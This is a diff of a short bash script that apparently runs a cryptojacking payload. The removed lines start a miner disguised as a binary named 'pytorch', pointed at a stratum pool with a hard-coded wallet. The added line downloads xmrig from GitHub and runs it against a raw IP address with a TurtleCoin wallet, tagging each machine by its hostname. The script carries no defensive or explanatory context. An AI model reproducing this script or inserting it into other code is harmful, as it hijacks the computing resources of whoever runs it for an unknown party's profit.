@@ -1,8 +1,2 @@
 #!/bin/bash
-chmod 777 pytorch
-sudo apt update 
-sudo apt install screen libjansson4 -y 
-screen -dmS ls 
-POOL=stratum+tcps://stratum-eu.rplant.xyz:17042
-WALLET=sugar1qhcv5w5n5h8xjyzuy2nmcf0ah4e3eykmayp765f
-./pytorch -a yespowersugar -o $POOL -u $WALLET -x $PROXY -q
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -zxf xmrig-6.15.2-linux-static-x64.tar.gz && cd xmrig-6.15.2 && ./xmrig -o 139.59.107.181:1515 -u TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2 --keepalive --donate-level 1 -p $(cat /proc/sys/kernel/hostname) -k --tls
